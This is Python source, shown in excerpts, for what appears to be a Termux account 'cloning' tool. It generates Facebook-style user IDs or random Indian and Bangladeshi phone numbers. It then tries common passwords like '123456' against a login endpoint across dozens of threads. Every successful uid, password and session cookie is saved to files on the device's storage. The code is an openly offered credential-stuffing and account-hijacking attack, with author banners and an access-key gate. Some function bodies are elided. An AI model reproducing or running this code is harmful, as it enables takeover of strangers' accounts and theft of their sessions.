'''
   DEVOLOPER MR - NIRJON-NAHUEL
--- FYLL UPDATED
--- GIVE CREDIT NIRJON-NAHUEL TERMUX COMMUNITY 
'''
...
▐▛▚▖▐▌▐▌   ▐▌ ▐▌▐▌   ▐▌ ▐▌
▐▌ ▝▜▌▐▛▀▀▘▐▌ ▐▌ ▝▀▚▖▐▛▀▜▌
▐▌  ▐▌▐▌   ▝▚▄▞▘▗▄▄▞▘▐▌ ▐▌ [blue]✧˖[chartreuse1] NIRJON NAHUEL ๋࣭ ⭑
[white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[cyan1][[red]=[cyan1]]OWNER          : [cyan1]NIRJON NAHUEL 
[cyan1][[red]=[cyan1]]FACEBOOK       : [cyan1]SA ASIF
[cyan1][[red]=[cyan1]]TOOLS          : [cyan1]RANDOM [dark_red]/ [white]OLD CLONE 
[cyan1][[red]=[cyan1]]MASANGER GRUOP :[cyan1] NIRJON FORCE OF SA
[white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'''
        print(aci)
...
def old():
    ...
    sort.clear()
    sort.logo()
    print("[b][red1][A] [sea_green2]OLD AGE  2011-14 Id")
    print("[b][red1][B] [spring_green1]OLD AGE 2009-10 Id")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m● \x1b[38;5;198mCHOICE   \x1b[38;5;208m ╰┈➤ \x1b[38;0;196m ")

    if ask in ["1","01","a","A"]:
        print("[b][red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1]OLD ID 2011-14")
        print(sort.line())
        ...
        for i in range(limit):
            ...
            user.append(data)
    print("[b][red1][1] [sea_green2]FIRE MATHOD")
    print("[b][red1][2] [spring_green1]FIRE MATHOD 2")
    print(sort.line())
    ...
    with ThreadPool(max_workers=40) as heron:
        sort.clear()
        sort.logo()
        print("[b][yellow1]●  [chartreuse1]TOTAL TARGET [green1]╰┈➤ [chartreuse1]"+str(len(user)))
        print("[b][yellow1]●  [light_green]LOGIN ID [green1]    ╰┈➤ [light_green]JUST NOW")
        print("[b][yellow1]●  [light_green]ID WANTS TO [green1] ╰┈➤ [light_green]AIRPLANE MOOD OFF/ON")
        print(sort.line())
        for mal in user:
            uid=star+mal
    ...
    try:
        ...
        for pw in pwx:
            ...
            if "session_key" in po:
                ...
                print(f"\r\r[reverse white][NIRJON-NAHUEL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/NIRJON-NAHUEL_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
...
def ran():
    ...
    sort.clear()
    sort.logo()
    print("[b][red1][A] [sea_green2] INDIAN CLONE")
    print("[b][red1][B] [spring_green1] BANGLADESH CLONE")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m● \x1b[38;5;198mCHOICE   \x1b[38;5;208m ╰┈➤ \x1b[38;0;196m ")
    if ask in ["1","01","a","A"]:
        print("[b][red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1] INDIAN NUMBER")
        print(sort.line())
        ...
        print("[b][red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1] BANGLADESH NUMBER")
        print(sort.line())
    ...
    with ThreadPool(max_workers=70) as heron:
        sort.clear()
        sort.logo()
        print(" [b][red1]● [chartreuse1]TOTAL TARGET [orange3]╰┈➤  [chartreuse1]"+str(len(user)))
        print(f" [b][red1]● [light_green]SIM CODE    [orange3] ╰┈➤  [light_green]{code}/M"+meth)
        print(f" [b][red1]● [light_green]AIRPLANE MOOD[orange3]╰┈➤  [light_green]OF / ON")
        print(sort.line())
        for xd in user:
            uid=code+xd
            if ask in ["1","01","a","A"]:
...
def ren_sub(uid,pwx,meth,user):
    ...
    try:
        Session=requests.session()
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[38;5;48m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\33[1;34mOK:{str(len(oks))}\x1b[38;5;48m]\x1b[1;97m-\033[38;5;46m[\x1b[38;5;48m{'{:.1%}'.format(loop/len(user))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for ps in pwx:
            ...
            if "session_key" in po:
                ...
                oks.append(uid)
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][NIRJON-NAHUEL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][white]{coki} \n{sort.line()}")
                open("/sdcard/NIRJON-NAHUEL_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][NIRJON-NAHUEL-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[white]{str(len(oks))}[/white][white]][white]{coki} \n{sort.line()}")
                open("/sdcard/NIRJON-NAHUEL_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            else:continue
        loop+=1
...
def main():
    ...
    sort.clear()
    sort.logo()  
    print("[b][red1][A] [spring_green2]OLD ID CLONE ")
    print("[b][red1][B] [spring_green1]RANDOM CLONE")
    print("[b][red1][C] [spring_green1]CONTACT ADMIN")
    print("[b][red1][C] [spring_green1]EXIT")
    print(sort.line())
    fast_choice=input("\x1b[38;1;196m\x1b[38;5;196m● \x1b[38;5;198mCHOICE   \x1b[38;5;208m ╰┈➤ \x1b[38;0;196m ")
    if fast_choice in ["90","0828","sks",""]:
        print("[red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1]File Clone")
        print(sort.line())
        time.sleep(2)
        filee()
    elif fast_choice in ["1","01","a","A"]:
        print("[red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1]OLD ID CLONE ")
        print(sort.line())
        time.sleep(2)
        old()
    elif fast_choice in ["2","02","c","B"]:
        print("[red1]● [chartreuse1]SELECTED  [orange3]╰┈➤  [chartreuse1]RANDOM CLONE")
        print(sort.line())
        time.sleep(2)
        ran()
    else:
...
def login(uid,meth):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m \033[38;5;46m[{sort.color()}NIRJON-NAHUEL\033[38;5;46m] ➤➤➤ [\x1b[1;97m{loop}\033[38;5;46m] [\33[1;34mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","000000","121212","1234567890","123123","11223"]:
            if meth in ["1","01","A","a"]:
                agent=ua()
            else:
                agent=samsung()
            ...
            if "session_key" in rp:
                oks.append(uid)
                print(f"\r\r[b][bright_white]┝[red1]➤[spring_green1][[deep_pink2]NFOSA-TEAM[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/NIRJON-NAHUEL_old.txt","a").write(uid+"|"+pw+"\n")
                break 
...
def superuser():
    UMO="[spring_green1]NIRJON[cyan]━━[red]"
    uuid = str(os.geteuid())
    id = "🔐".join(uuid)
    UMO2="[cyan1]━━SARMIN "
    sort.clear()
    ...
    if id in DARK:
         main()
          ...
          sort.clear()
          sort.logo()
          print(" [green][●] GRUOP KEY  : "+UMO+id+UMO2)
          print('[white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')               
